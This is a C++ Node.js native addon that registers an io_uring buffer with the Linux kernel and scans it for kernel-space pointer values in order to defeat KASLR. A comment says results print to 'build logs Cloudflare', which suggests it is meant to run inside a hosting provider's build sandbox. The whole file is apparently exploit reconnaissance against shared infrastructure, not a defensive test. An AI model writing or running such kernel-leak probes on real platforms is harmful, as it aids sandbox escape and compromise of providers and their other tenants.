#include <node.h>
#include <v8.h>
#include <linux/io_uring.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <string>

using namespace v8;

// Global pointers for persistence memory
void* global_buffer_ptr = nullptr;
size_t global_buffer_size = 1024 * 1024; // 1MB

void TestMemoryMapping(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    struct io_uring_params p;
    memset(&p, 0, sizeof(p));
    
    // Setup ring
    int ring_fd = syscall(__NR_io_uring_setup, 32, &p);
    std::string log = "";

    if (ring_fd < 0) {
        log = "[-] io_uring_setup failed. Errno: " + std::to_string(errno) + "\n";
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, log.c_str()).ToLocalChecked());
        return;
    }

    // 1MB buffer allocation - We'll leave it mapped in memory
    if (global_buffer_ptr == nullptr) {
        global_buffer_ptr = mmap(NULL, global_buffer_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    }
    
    if (global_buffer_ptr == MAP_FAILED) {
        log = "[-] mmap failed\n";
        global_buffer_ptr = nullptr;
    } else {
        // Initial with null 0
        memset(global_buffer_ptr, 0, global_buffer_size);

        struct iovec iov;
        iov.iov_base = global_buffer_ptr;
        iov.iov_len = global_buffer_size;

        // Regist buffer to kernel
        int reg_res = syscall(__NR_io_uring_register, ring_fd, IORING_REGISTER_BUFFERS, &iov, 1);
        
        if (reg_res < 0) {
            log += "[-] IORING_REGISTER_BUFFERS failed. Errno: " + std::to_string(errno) + "\n";
            if (errno == 1) log += "[!] EPERM: Lockdown aktif.\n";
        } else {
            log += "[+] SUCCESS: 1MB Buffer registered and persistent for scanning.\n";
        }
    }

    close(ring_fd);
    args.GetReturnValue().Set(String::NewFromUtf8(isolate, log.c_str()).ToLocalChecked());
}

void ScanKernelLeak(const FunctionCallbackInfo<Value>& args) {
    Isolate* isolate = args.GetIsolate();
    
    if (!global_buffer_ptr) {
        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Buffer not initialized").ToLocalChecked());
        return;
    }

    uint64_t* scan_ptr = (uint64_t*)global_buffer_ptr;
    uint32_t found_count = 0;

    // Scanning 8 byte for searching kernel space addrs
    for (size_t i = 0; i < global_buffer_size / 8; i++) {
        // pattern KASLR x86_64: 0xffffffffXXXXXXXX
        if ((scan_ptr[i] >> 32) == 0xffffffff) {
            // print stdout to build logs Cloudflare
            printf("[!!!] KERNEL POINTER LEAK FOUND at index %zu: 0x%lx\n", i, (unsigned long)scan_ptr[i]);
            found_count++;
        }
    }

    args.GetReturnValue().Set(Integer::New(isolate, found_count));
}

void Init(Local<Object> exports) {
    NODE_SET_METHOD(exports, "testMemory", TestMemoryMapping);
    NODE_SET_METHOD(exports, "scanKernelLeak", ScanKernelLeak);
}

NODE_MODULE(NODE_GYP_MODULE_NAME, Init)
